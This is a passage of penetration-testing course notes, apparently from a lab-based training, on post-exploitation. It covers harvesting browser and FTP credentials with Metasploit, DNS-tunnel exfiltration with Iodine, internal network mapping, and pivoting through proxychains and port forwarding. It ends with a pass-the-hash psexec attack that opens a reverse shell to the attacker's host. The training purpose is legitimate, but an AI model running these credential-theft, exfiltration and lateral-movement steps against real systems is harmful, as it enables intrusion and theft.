    For example we can search for IM logs like Skype, Windows Live Messenger, software configuration files such as FTP clients, SVN clients, and so on, and then download the files locally in order to inspect them.

    As you can imagine, the kind of files to retrieve differs from victim to victim: web browser history is a good place to look, since you can find internal corporate network information.

  Once we have downloaded and analyzed files on the remote file system, we can move on with our investigation and start searching for credentials stored on the system.
    We can use Metasploit modules or use third party software ([Nirsoft][http://www.nirsoft.net/] has many of these tools for windows)

      The modules that Metasploit offers can be found in the `post/windows/gather/credentials` path:
        ```
        meterpreter > run post/windows/gather/credentials/
        run post/windows/gather/credentials/bulletproof_ftp
        run post/windows/gather/credentials/coreftp
        run post/windows/gather/credentials/credential_collector
        ...
        ```

    Besides scripts stored in the credentials folder, it is always useful to give a look to the scripts stored in the parent path.
      - `enum_chrome`
        For example the `enum_chrome` script can be used tot gather credentials stored in Google Chrome.
          ```
          meterpreter > run post/windows/gather/enum_chrome

          [*] Running as user 'els\els' ...
          [*] Extracting data for user 'els' ...
          ...
          ```

        At the end of the output we can see that the script was able to decrypt the data. If we inspect the file created, we will see the plain-text credentials stored in it:
          ```
          [*] => Google Now
          [*] Decrypted data saved in: /root/.msf5/loot/201603033113839_default_192.168.102.157_chrome.decrypted_412961.txt
          ```
          |  <br>
          V
          ```
          stduser@les:~$ cat /root/.msf5/loot/201603033113839_default_192.168.102.157_chrome.decrypted_412961.txt
          Decrypted data
          ==============

            Name                 Decrypted Data         Origin
            ----                 --------------         ------
            elstarget@gmail.com   Vbk19jlaDry9AgfgAY    https://accounts.google.com/ServiceLoginAuth
          ```
      - `multi`
        Notice that other gathering scripts are available under the path `post/multi/gather`
          ```
          meterpreter > run post/multi/gather
          run post/multi/gather/apple_ios_backup
          run post/multi/gather/check_malware
          run post/multi/gather/dbvis_enum
          run post/multi/gather/dns_bruteforce
          ...
          ```
  - `enum_application`
    As you can imagine, knowing what software is installed on the machine is important. As you already know, we can list them with the `enum_application` script:
      ```
      meterpreter > run post/windows/gather/enum_applications

      [*] Enumerating applications installed on ELS

      Installed Applications
      ======================

        Name                                          Version
        ----                                          -------

        GnuWin32: Grep-2.5.4                          2.5.4
        Google Chrome                                 48.0.2564.116
        Google Chrome                                 48.0.2564.116
        ...
      ```

  Instead of using meterpreter scripts, we could also use external tools.
  In our lab environment, we will use the [Web Browser Pass View](http://www.nirsoft.net/utils/web_browser_password.html) tool to extract credentials saved in the web browser installed on the target machine.

As you can imagine the task to perform, the commands, the tools, and the paths to check, strongly depends on the OS you are pentesting.

Moreover, the role of the victim machine on the remote network will suggest what to look for. (see vid-242)
  In the following video we will see how to use the previous commands in order to gather as much information as we can from the target machine.

  In our case we will gather them from an employee workstation, so we will try to get system, user, network information, installed applications, account credentials, IM logs, and so on.

#### 6.3.1. Exfiltration over DNS with Iodine (DNS Tunnelling)
  Most of the time, with real world-attacks the objective of malicious actors is not only compromise **systems for use of nefarious purposes**, but it also often their objective to **exfiltrate sensitive information**, and a lot of the time, they do so over protocols that are not typically monitored.

  One method that has been increasingly seen in the wild is the use of DNS for data exfiltration, also known as "[DNS Tunneling](http://beta.ivc.no/wiki/index.php/DNS_Tunneling)".

  This is a popular method due to the fact that many organizations are not logging or alerting on anomalous DNS traffic which makes it a go-to vector for exfiltrating data out of the target network, and over often under-monitored "channel".

  One tool that can be used for this purpose is known as "[Iodine](https://code.kryo.se/iodine/)".

    Not only iodine can help with exfiltrating data from a target environment, but it can also help in penetration testing engagements that restrict access to the internet due to authenticated proxies for which we don't have credentials, or can also be used for bypassing captive portals, such as seen commonly in wireless networks.

  In a typical scenario with DNS Tunneling, the attacker DNS tunnel client component initiates a connection to the attacker-controlled DNS tunnel server component through an organization's DNS server, and can be generalized with the diagram below (see img-248):
    ```
              Attacker-----------DNS Tunnel--------------Attacker-Controlled
    (DNS Tunnel Client Component)                  (DNS Tunnel Server Component)
                  |                                               ^
                  |                                               |
                  ----------> FooCorp DNS Server-------------------
    ```

  Once the DNS tunnel is established, the client transmits all network traffic, encoded, and in the form of DNS queries, typically as [TXT][https://en.wikipedia.org/wiki/TXT_record] records, through the tunnel, which is then decoded at the other end by the server component or attacker-controlled "DNS Server".

    Information regarding exactly how this works, can be found [here](http://beta.ivc.no/wiki/index.php/DNS_Tunneling).

    From there, we can trivially tunnel all of our traffic through an SSH socks server, completely over DNS, bypassing firewalls or any authenticated proxies along the way.

  Some pre-requisites for using Iodine to create a DNS tunnel for exfiltration are:
    1. Control over a domain name that you own and its DNS configuration, and;
    2. An IP address to act as the authoritative Name Server for your domain name for which you have SSH access to as well

  Since DNS Tunneling requires a client/server model, you'll want those 2 pieces in place in order to experiment with this method.

  In the video we'll show how we can configure a DNS tunneling implementation with Iodine using a domain name we have registered with GoDaddy, in addition to using IP address hosted on a VPS provider to act our exfiltration tunnel endpoint.

  (see vid-253)

__________________________
## 6.4. Mapping the internal network
In the previous step, we took into account information residing on the local victim computer. We will now take a look at the network.

  As the name suggests, the main purpose of this step is to map internal organization's network in order to find other exploitable machines to getting closer to our goal (if any specified in the engagement)

  Since we already have access to at least one internal machine, we can directly interact with the target environment (internal network) using it as a *bridge*.

  Again, the purpose of this step is to infiltrate and exploit more hosts.

  This is important when we have to prove that certain areas of the network are vulnerable or, when the client wants to verify the exposure of a certain information stored on given devices.

While we infiltrate networks, we still have to collect this information:
- Network equipment such as firewall, switches, and routers
- Other networked hosts and servers <br>
  For each of them learn about OS, open ports, exploitable services, and more
- Networking protocols and IP addresses
- Traffic and data transmitted in the network.

For the sake of clarity, let us use a simple scenario like this:
  ```
      Attacker    ---------------Internet--------------- Router with Public IP
  IP:66.176.44.***                                        Local IP:10.10.10.1
                                                                  |
                                                                  |
                                                                Switch
                                                                  |
                                                                  |
                            Exploited Machine ---------------------
                               10.10.10.15
  ```

Of course, in a real post exploitation process, we do not know the network map in advance. So let's see how we can figure it out, starting from the exploited machine.
  - `ipconfig` (Windows) or `ifconfig` (Linux)
    One of the simplest commands that can help us start drawing the network map is `ipconfig` (Windows) or `ifconfig` (Linux).
      The two commands will display the network configuration for each NIC on the machine.

      Although we are dealing with the Windows machine, meterpreter allows us to run `ifconfig` too.

      The result tells us that there is only one NIC and that the internal IP address of the machine is `10.10.10.15`.

  - `route print` (Windows) or `route -v` (Linux)
    Other network information can be found in the IP routing table using `route print` command in Windows and `route -v` in Linux

    Result :
      ```
      meterpreter > route
      IPv4 network routes
      ===================

        Subnet            Netmask          Gateway      Metric    Interface
        ------            -------          -------      ------    ---------
        0.0.0.0           0.0.0.0          10.10.10.1   266       11
        10.10.10.0        255.255.255.0    10.10.10.15  266       11
        10.10.10.15       255.255.255.255  10.10.10.15  266       11
        10.10.10.10.255   255.255.255.255  10.10.10.15  266       11
        127.0.0.0         255.0.0.0        127.0.0.1    306       1
      ```

  - `arp`
    Another bulit-in command that can help us to get even more information is `arp`, which displays the host ARP cache.
      ```
      ARP cache
      =========
        IP address    MAC address          Interface
        ----------    -----------          ---------
        10.10.10.1    00:50:56:b1:10:48    11
        10.10.10.5    00:50:56:b1:c8:93    11
        10.10.10.255  ff:ff:ff:ff:ff:ff    11
        224.0.0.22    00:00:00:00:00:00    1
        244.0.0.22    01:00:5e:00:00:16    11
      ```
      As we can see in the results, we discovered a new IP address: `10.10.10.5`

    **While you find new targets, remember to keep track of your findings.**
      ```
          Attacker    ---------------Internet--------------- Router with Public IP
      IP:66.176.44.***                                        Local IP:10.10.10.1
                                                                      |
                                                                      |
                                                                    Switch
                                                                      |
                                                                      |
                        (Exploited) Machine 1 -------------------------
                                   10.10.10.15                        |
                                                                      |
                                    Machine 2 -------------------------
                                   10.10.10.5
      ```
  - `netstat`
    Although `arp` may reveal new hosts in the network, another very important command to run is `netstat`.
    `netstat` allows us to display all the host network connections, which means listening ports, established connections, and so on.

    We also able to see process associated with each connection.
    For example, we can see that there is a current connection with the host `10.10.11.100`, on port `80`:
      ```
      Connection list
      ===============

        Proto   Local address       Remote address    State       User   Inode   PID/Program name
        -----   -------------       --------------    -----       ----   -----   ----------------   
        tcp     0.0.0.0:135         0.0.0.0:*         LISTEN      0      0       696/svchost.exe
        tcp     0.0.0.0:445         0.0.0.0:*         LISTEN      0      0       4/System
        tcp     0.0.0.0:49152       0.0.0.0:*         LISTEN      0      0       408/wininit.exe
        tcp     0.0.0.0:49153       0.0.0.0:*         LISTEN      0      0       800/svchost.exe
        ...
        tcp     10.10.10.10:49208   10.10.11.100:80   ESTABLISHED 0      0       3940/iexplore.exe
        ...
      ```

At this time we have basic information about the network and an exploited machine.

We can now move on and start detecting all the other hosts on the internal network. We will use the exploited machine as the router for our scans.

This way we can avoid security measures such as firewalls and IDS that may block incoming connections from the external network.
  - `arp_scanner`
    The easiest way to do this, is by running `arp_scanner`. The scripts performs an ARP scan in the local network and then lists the IP and MAC addresses found.

    The following is the help manual for the script:
      ```
      meterpreter > run arp_scanner -h
      Meterpreter Script for performing an ARPS Scan Discovery

      OPTIONS:

          -h        Help menu.
          -i        Enumerate Local Interfaces
          -r <opt>  The target address range or CIDR identifier
          -s        Save found IP Addresses to logs

      ```

    Let us run the command on the entire target subnet (`10.10.10.10/24`) and see what we obtain.
      ```
      meterpreter > run arp_scanner -r 10.10.10.0/24
      [*] ARP Scanning 10.10.10.0/24
      [*] IP: 10.10.10.1 MAC 00:50:56:b1:10:48
      [*] IP: 10.10.10.7 MAC
      [*] IP: 10.10.10.5 MAC
      [*] IP: 10.10.10.15 MAC
      [*] IP: 10.10.10.25 MAC
      ```

    Although the `arp_scanner` script is very straightforward, you should be aware that Metasploit offers different modules that we can use to detect alive hosts, open ports, and more.

  - `ping_sweep`
    Let's keep going with the alive host detection and run a ping scan on the remote network. The module that we are going to use is called `ping_sweep` and it allows us to set the session to which to run the scan.

    The following is the configuration of our module:
      ```
      msf > use post/multi/gather/ping_sweep
      msf post(ping_sweep) > show options

      Module options (post/multi/gather/ping_sweep):

        Name     Current Setting  Required  Description
        ----     ---------------  --------  -----------
        RHOSTS   10.10.10.0/24    yes       IP Range to perform ping sweep against.
        SESSION  2                yes       The session to run this module on
      ```
      With this configuration, we are telling Metasploit to run a ping sweep in the network `10.10.10.0/24`, using the active session (2) on the exploited machine.

    Let's run the module and see what we get:
      ```
      msf post(ping_sweep) > run

      [*] Performing ping sweep for IP range 10.10.10.0/24
      [*]    10.10.10.5 host found
      [*]    10.10.10.7 host found
      [*]    10.10.10.1 host found
      [*]    10.10.10.15 host found
      [*]    10.10.10.25 host found
      [*] Post module execution completed
      msf post(ping_sweep) >
      ```

      So far it seems we have found the same hosts discovered with `arp_scanner` module.

    If you recall the `netstat` command run before, you would probably remember that an active connection with the machine `10.10.11.100`. As you can see, this machine is part of another network.

    Since we cannot directly reach it from our machine, we can configure the `ping_sweep` module to scan the entire subnet, in order to find new hosts.

    Let us change the `RHOSTS` parameter in the `ping_sweep` module and see what we obtain.
      ```
      msf post(ping_sweep) > set RHOSTS 10.10.11.0/24
      RHOSTS => 10.10.11.0/24
      msf post(ping_sweep) > run

      [*] Performing ping sweep for IP range 10.10.11.0/24
      [*]     10.10.11.1 host found
      [*]     10.10.11.100 host found
      [*]     10.10.11.111 host found
      [*] Post module execution completed
      msf post(ping_sweep) >
      ```

      As we can see, we have discovered another host.

    The final configuration of the networks and hosts discovered can be summarized as follows:
    ```

  - `netenum`
    The last script we are going to use is `netenum`. Although we will not use it in the following sections, we strongly suggest you play with it since it offers many features and configurations:
      ```
      meterpreter > run netnum -h
      Network Enumerator Meterpreter Script
      Usage:

      OPTIONS:
      ```

Now that we know the addresses of new potential targets, we can scan them and check open ports, enabled services, their OS, and so on.

#### Pivoting
Notice that we are not able to directly access these hosts from our machine, therefore we will have to tunnel our traffic through session on the exploited machine.

The following image explains how pivoting works (see img-280):
  ```
           -3-----------        -------------
  Attacker -1-----------Internet------------- Router
                                            10.10.10.1
                                               | |
                                               1 3
                                               | |
                                        -----Switch-----
    1 : Attacker to Victim 1            | | |        | |
    2 : Attacker to Victim 2            1 3 2        2 3
                                        | | |        | |
                                      Victim 1     Victim 2
                                    10.10.10.15   10.10.10.5

  ```
  In this case the attacker uses the session on Victim 1 to send and receive communications to and from Victim 2.

So we know the target subnet is `10.10.10.0/24`, and we want to route the traffic to/from this network through the meterpreter session on the exploited machine.

This is an extremely important part of your Post Exploitation process, so make sure you understand it correctly.

To pivot on sessions, we can use 2 different commands, both setting a new route to a new network:
  - `route add 10.10.10.0 255.255.255.0 2`
    This will tell metasploit to route all the traffic intended to the network `10.10.10.0/24`, through the meterpreter session number 2. In other words, all the traffic to `10.10.10.0/24` will be tunneled through Victim 1.

    We can run the command from the msfconsole as follows, and then check if route has been added with the `route print` command:
      ```
      msf > route add 10.10.10.0 255.255.255.0 2
      [*] Route added
      msf > route print

      Active Routing Table
      ====================

        Subnet              Netmask           Gateway
        ------              -------           -------
        10.10.10.0          255.255.255.0     Session 2
      ```

    Note: <br>
    If you want to delete, print or flush the routes you can use the route command.
    The following is the help manual displaying all available options.
      ```
      msf > route -h
      Usage: route [add/remove/get/flush/print] subnet mask [comm/sid]

      Route traffic destined to a given subnet through a supplied session.
      The default comm is Local.
      ```
  - `net autoroute -s 10.10.10.0.24`
    Different from the previous command, this is a script that we have to run from within a meterpreter session. Notice that the results of the two commands are the same. All the traffic intended to the network `10.10.10.0/24`, will be routed through the current meterpreter session.

    Let's see how the command works and then check the current routing table with the `autoroute -p` command:
      ```
      meterpreter > run autoroute -s 10.10.10.0/24
      [*] Adding a route to 10.10.10.0/255.255.255.0...
      [+] Added route to 10.10.10.0/255.255.255.0 via 66.176.44.1
      [*] Use the -p option to list all active routes
      meterpreter > run autoroute -p

      Active Routing Table
      ====================

        Subnet              Netmask             Gateway
        ------              -------             -------
        10.10.10.0          255.255.255.0       Session 2
      ```

With the route set, we are now able to use the exploited machine (through our meterpreter session) as a router for our communication with the organization internal network (`10.10.10.0/24`).
  For example, let us try to run a port scan on one of the host found in the previous steps.

  The metasploit module that allows is to run a simple TCP port scan is located at the following path:
    ```
    use auxiliary/scanner/portscan/tcp
    ```

  Example:
    ```
    msf > use auxiliary/scanner/portscan/tcp
    msf auxiliary(tcp) > show options

    Module options (auxiliary/scanner/portscan/tcp):

      Name            Current Setting   Required    Description
      ----            ---------------   --------    -----------
      CONCURRENCY     10                yes         The number of concurrent port to
      PORTS           100-500           yes         Ports to scan (e.g.22-25,80,1-90)
      RHOSTS          10.10.10.5        yes         The target address range or CIDR
      THREADS         10                yes         The number of concurrent threads
      TIMEOUT         1000              yes         The socket connect timeout in ms
    ```

    As you can see, the module allows us to select the hosts to scan, the port range, the number of threads. and a few other options/

  Let's run it and see if the target has some open ports:
    ```
    msf auxiliary(tcp) > run

    [*] 10.10.10.5:139 - TCP OPEN
    [*] 10.10.10.5:135 - TCP OPEN
    [*] 10.10.10.5:445 - TCP OPEN
    [*] Scanned 1 of 1 hosts (100% complete)
    [*] Auxiliary module execution completed
    msf auxiliary(tcp) >
    ```

    The next snapshot, shows the traffic on the host `10.10.10.15` (Victim 1), while performing the port scan on Victim 2 from our Attacker machine.

  As you can notice, the traffic happens between Victim 1 and Victim 2, so the routing is working fine.

  Here we can see that the scan is performed by the Victim 1. (see img-291, wireshark)

  Once again, remember that this is working only because we add the route to the target network. Indeed if we flush the routes and try to run the command once again, we will not obtain any results.

So far we have just scratched the surface of the internal network. We have to identify all the other hosts first, their services, open ports, and so on.

Only after the information gathering phase on these hosts is complete, we can continue with our penetration phase.
  Remember this is indeed aa cyclic process.

Sometimes Metasploit modules are not enough and we may want to run tools like Nmap or Nessus on these new hosts.

  To do this, we will once again use the current session on the exploited machine, to pivot external tools via the meterpreter session and its routes.

  In order to do this we will have to set up `socks4` proxy within Metasploit and then use tools like `proxychains` to route the traffic through this proxy.

  Steps:
    1. First, select and configure the `socks4a` module on Metasploit:
      ```
      msf > use auxiliary/server/socks4a
      msf auxiliary(socks4a) > info

            Name: Socks4a Proxy Server
          Module: auxilary/server/socks4a
         License: Metasploit Framework License (BSD)
            Rank: Normal
      ```
      This module provides a socks4 proxy server that uses the built-in Metasploit routing to relay connections.
    2. Once selected, we just need to set the `SRVHOST` and the `SRVPORT` parameters, and then `run` the module <br>
      In our case we will leave the address to listen on (`SRVHOST`) as default, but we will change the port to `1080`:
        ```
        msf auxiliary(socks4a) > show options

        Module options (auxiliary/server/socks4a):

            Name      Current Setting   Required    Description
            ----      ---------------   --------    -----------
            SRVHOST   0.0.0.0           yes         The address to listen on
            SRVPORT   1080              yes         The port to listen on
        ```
      Once the module runs, we will see that our host will listen for incoming connection on port 1080:
        ```
        root@els:~# netstat -tulpn | grep 1080
        tcp       0       0 0.0.0.0:1080        0.0.0.0:*           LISTEN
        16121/ruby
        ```

    3. The last step is to configure tools like `proxychains`, in order to use the address and port set in Metasploit.
      `proxychains` is a tool that forces any TCP connection made by any given application, to follow through proxy like SOCKS4, SOCK%, TOR, and so on.

      To configure `proxychains`, let us open the `proxychain.conf` file (you can find it in `/etc/`), and change the last line as follow:
        ```
        [ProxyList]
        # add proxy here ...
        # meanwhile
        # defaults set to "tor"
        socks4    127.0.0.1 1080
        ```

      In other words, we are instructing `proxychains` to use the proxy set with Metasploit and its routes. The following diagram shows how the traffic will be redirected:
        ```
        Tools-->proxychains-->Metasploit socks4a proxy - 0.0.0.0:1080-->Meterpreter routes-->Meterpreter session--> Target network
        ```

  Now that everything is configured, we can use a scanning tool, such as Nmap, against the host within the target's internal network. In our test, we will try to scan the host `10.10.10.5`.
    Our command will look like the following:
      ```
      proxychains nmap -sT -Pn -n 10.10.10.5 --top-ports 50
      ```
      By adding `proxychains` before the Nmap scan command, we will force nmap to run through it.

    As we can see in the following screencap, the Nmap scan is going through the proxy (see img-302):
      ```
      stsuser@els:~$ sudo proxychains nmap -sT -Pn -n 10.10.10.5 --top-ports 50
      ProxyChains-3.1 (http://proxychains.sf.net)

      Starting Nmap 7.00 ( http://nmap.org ) at 2016-03-23 EDT

      |S-chain|-<>-127.0.0.1:1080-<><>-10.10.10.5:110-<--denied
      ```

    At the end of the scan, we will see the results in our terminal, as if we were running it normally:
      ```
      |S-chain|-<>-127.0.0.1:1080-<><>-10.10.10.5:1433-<--denied
      Nmap scan report for 10.10.10.5

      445/tcp   open  microsoft-ds

      Nmap done: 1 IP address (1 host is up) scanned in 71.66 seconds
      ```

    If we inspect the traffic on the exploited machine, we can see that there is no direct traffic between our attacker box (`66.176.44.106`) and the target (`10.10.10.5`) (see img-104)

So far we used `proxychains` to run a port scan on the internal network. It is important to understand that thanks to this configuration we are able to route packets to networks behind NAT configurations or Firewalls.

Moreover, we can use `proxychains` in order to establish connections to services running on machines within the target network.

  For example, if one of the machine has services like SSH, telnet, databases, and so on, we can use the following commands to contact and establish a connection with it:
    ```
    proxychains ssh 10.10.10.XX
    ```
    ```
    proxychains telnet 10.10.10.XX
    ```

In addition to `proxychains`, we can also use `portfwd` command, implemented in meterpreter. It allows us to forward connections to specific addresses and ports on the remote network.

Therefore, if we want to access a webserver, a share or any other service on the remote network, we can just set a port forwarding rule through the meterpreter session, and access it from our local address.
  For example, the following command will open a listener on our local IP address on port 3333, and will forward the connection to the IP address `10.10.10.5` on port 3389:
    ```
    meterpreter > portfwd add -1 3333 -p 3389 -r 10.10.10.5
    [*] Local TCP relay created: 0.0.0.0:333 <-> 10.10.10.5:3389
    meterpreter > portfwd
    0: 0.0.0.0:3333 -> 10.10.10.5:3389

    1 total local port forwards.
    ```

  Once the commands runs, we should see a listening connection, like the following:
    ```
    stduser@les:~/Downloads$ netstat -tulpn | grep 3333
    (Nott all process could be identified, non-owned process info will not be shown, you would have to be root to see it all.)
    tcp     0     0 0.0.0.0:3333        0.0.0.0:*     LISTEN      -
    ```

  Now that we are sure we are listening for incoming connection on port 3333, we can try to establish an RDP session with the machine `10.10.10.5`.

  Once again, remember that the traffic will go through the exploited machine, to the target machine.
    ```
    Attacker : portfwd listener (0.0.0.0:3333)->Meterpreter session
                                                        |
                                                        V
                                       Exploited machine : 10.10.10.15
                                                        |
                                                        | 10.10.10.5:3389
                                                        V
                                          Target machine : 10.10.10.5

    ```

  To do this, we will try to establish an RDP session to our local IP address on port 3333:
    ```
    rdesktop 127.0.0.1:3333
    ```


At this point of pentest you should have a more detailed map of the internal network and its hosts.
It is now time to start digging more closely to see if any of the new machines discovered can be exploited (via our current active session on Victim 1 - 10.10.10.15)

(see vid-313)
__________________________
## 6.5. Exploitation through Pivoting
Thanks to the power of Pivoting, we can move around the internal target network easily and quickly.
  We will leverage this potential to attack and exploit new hosts.
  We should at this point use our exploitation skills.

This let us introduce a very powerful attacking technique that proves to be extremely useful during Post Exploitation (and other areas): *Pass the hash*.

A weakness in the Windows authentication protocols allows users to log on the OS by just providing the hashes version of the password (NT or LM) instead of the actual clear text password.

This opens an attacking vector typical of the Windows environments.

  When the same password is used on multiple hosts within a network and you get the hash of the password from one of these hosts, you automatically have access to all other machines.

  Even though you do not know the actual password (for example, it takes too long to crack).

  This happens because there is no salt in Windows passwords.

  Tools and Metasploit modules have been produced to exploit the weakness and get the most out of it: execution of a shellcode.

  Since we have already dumped hashes from the first attacked machine, if the same user, with the same password exists on other machines, we should be able to get access to all of them.

  The beauty of this attack, is that we do not even need to crack the password hashes and get the plain text. We only need the hashes.

  Let us dump our victim hashes with `hashdump` command.
    ```
    meterpreter > hashdump
    Administrator:500:1404e35b51404eeeaad3b4aad3b435b5:d2688ac52a4d9e6bffa7969b74132a4f:::

    As we can see, there are different users that we can test for our purpose

  The Metasploit module that we can use to run the *pass-the-hash* attack is called `psexec`:
    ```
    msf > use exploit/windows/smb/psexec
    msf exploit(psexec) > info

          Name: Microsoft Windows Authenticated User Code Execution
        Module: exploit/windows/smb/pmexec

    Description:
      This module uses a valid administrator username and password (or password hash) to execute an arbitrary payload. This module is similar to the "psexec" utility provided by SysInternals. This module is now able to clean upu after itself. The service created by this tool uses a randomly chosen name and description.
    ```

  Let's say we want to try the attack using the user credentials for the user account `els`. We configure the module with the following information:
    - A payload to use
    - The remote host on which run the attack (`RHOST`)
    - The user account to use (`SMBUser`)
    - The password hash for the account (`SMBPass`)

  This are the commands that we are going to run in order to configure our module:
    ```
    msf exploit(psexec) > set PAYLOAD windows/meterpreter/reverse_tcp
    PAYLOAD => windows/meterpreter/reverse_tcp
    msf exploit(psexec) > set LHOST 66.176.44.106
    LHOST => 66.176.44.106
    msf exploit(psexec) > set RHOST 10.10.10.5
    RHOST => 10.10.10.5
    msf exploit(psexec) > set SMBUser els
    SMBUser => els
    msf exploit(psexec) > set SMBPASS aad3b435b51404eeaad3b435b51404ee:d9e6bffa796d2688ac52a49b74132a4f
    SMBPASS => aad3b435b51404eeaad3b435b51404ee:d9e6bffa796d2688ac52a49b74132a4f
    ```

    Once again, we will target the host `10.10.10.5`.

  Once the module ends, if the exploit works we will obtain a new meterpreter session on the new victim (`10.10.10.5`):
    ```
    msf exploit(psexec) > exploit

    [*] Started reverse TCP handler on 1912.168.102.147:4444
    [*] Connecting to the server...
    [*] Authenticating to 10.10.10.5:445 as user 'els'...
    [*] Selecting native target
    [*] Uploading payload...
    [*] Created \mcRcNNkT.exe...
    [*] Sending stage (957487 bytes) to 66.176.44.1
    [+] 10.10.10.5:445 - Service started successfully...
    [*] Deleted \mcRcNNkT.exe...
    ```

We have successfully exploited a new host by means of *pass-the-hash* technique and we now have two compromised machines on the target network.

Not that we have full control of the new host, we can start over the Post Exploitation process from this host in order to get more information about the organization, its services, hosts, networks, and so on.

Notice that the same steps can be used with almost all other Metasploit modules.
  For example, if we find a vulnerable service on one of the internal machines, we just need to select and run the correct Metasploit module.

  Moreover, remember that you can also run exploits through `proxychains`. This mens that if Metasploit does not offer any module for that specific vulnerability, but you have a working exploit, you can pivot it to the internal network via `proxychains` and `socks4a`.

## 6.6. Conclusion
At this point, you should have the methodology and the skill-set necessary to perform a thorough Penetration test on a remote network.

Make sure to refer to our proposed Post Exploitation process during your engagements and make sure to optimize it and customize it according to the scope and environment of your test.

Now that we have covered all phases of an engagement, the below link is a guide indicating how to properly construct your report.
